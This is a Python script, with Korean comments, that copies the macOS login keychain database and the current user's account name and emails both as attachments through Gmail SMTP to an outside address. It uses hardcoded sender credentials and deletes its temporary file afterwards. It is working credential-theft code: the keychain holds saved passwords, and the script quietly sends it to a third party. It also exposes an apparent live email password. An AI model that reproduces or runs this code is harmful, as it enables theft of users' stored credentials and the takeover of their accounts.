import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def attach_files(msg, attachments):
    """
    파일을 이메일 메시지에 첨부합니다.
    - msg: 이메일 메시지 객체
    - attachments: 첨부 파일 경로 리스트
    """
    for attachment in attachments:
        if os.path.exists(attachment):
            try:
                with open(attachment, "rb") as file:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(file.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        'Content-Disposition',
                        f'attachment; filename={os.path.basename(attachment)}',
                    )
                    msg.attach(part)
            except Exception as e:
                print(f"Failed to attach {attachment}: {e}")
        else:
            print(f"Attachment not found: {attachment}")


def send_email(smtp_server, smtp_port, sender_email, sender_password, recipient_email, subject, body, attachments):
    """
    이메일을 키체인 파일과 추가 파일 첨부 형태로 전송
    - smtp_server: SMTP 서버 주소
    - smtp_port: SMTP 포트
    - sender_email: 발신 이메일 주소
    - sender_password: 발신 이메일 비밀번호
    - recipient_email: 수신 이메일 주소
    - subject: 이메일 제목
    - body: 이메일 본문
    - attachments: 첨부할 파일 경로 리스트
    """
    try:
        # 이메일 메시지 구성
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        # 첨부 파일 추가
        attach_files(msg, attachments)

        # SMTP 서버 연결 및 이메일 전송
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)

        print(f"Email sent to {recipient_email}.")
    except Exception as e:
        print(f"Failed to send email: {e}")


def save_user_account_name(output_file):
    """
    사용자 계정 이름을 검색하고 텍스트 파일로 저장
    - output_file: 저장할 파일 경로
    """
    try:
        account_name = os.getlogin()  # macOS 사용자 이름 가져오기
        with open(output_file, "w") as file:
            file.write(f"User Account Name: {account_name}\n")
        print(f"User account name saved to {output_file}.")
        return output_file
    except Exception as e:
        print(f"Failed to get user account name: {e}")
        return None


def main():
    # Step 1: 파일 경로 설정
    keychain_file = os.path.expanduser("~/Library/Keychains/login.keychain-db")
    user_info_file = "user_account_name.txt"

    # 사용자 계정 이름 파일 생성
    account_file = save_user_account_name(user_info_file)

    # 키체인 파일과 사용자 계정 파일 존재 확인
    if os.path.exists(keychain_file) and account_file:
        # Step 2: SMTP 설정
        smtp_config = {
            "smtp_server": "smtp.gmail.com",
            "smtp_port": 587,
            "sender_email": "nkkmc7@gmail.com",
            "sender_password": "foog cvfo khlh uzuv",
            "recipient_email": "kmc7@nol-universe.com",
        }

        # Step 3: 이메일 전송
        send_email(
            smtp_server=smtp_config["smtp_server"],
            smtp_port=smtp_config["smtp_port"],
            sender_email=smtp_config["sender_email"],
            sender_password=smtp_config["sender_password"],
            recipient_email=smtp_config["recipient_email"],
            subject="login.keychain-db File and User Info Attached",
            body="Attached are the login.keychain-db file and the user's account information.",
            attachments=[keychain_file, user_info_file],
        )

        # 전송 후 임시 파일 삭제
        try:
            os.remove(user_info_file)
            print("Temporary files removed.")
        except Exception as e:
            print(f"Failed to remove temporary files: {e}")
    else:
        print("Required files are missing.")


if __name__ == "__main__":
    main()
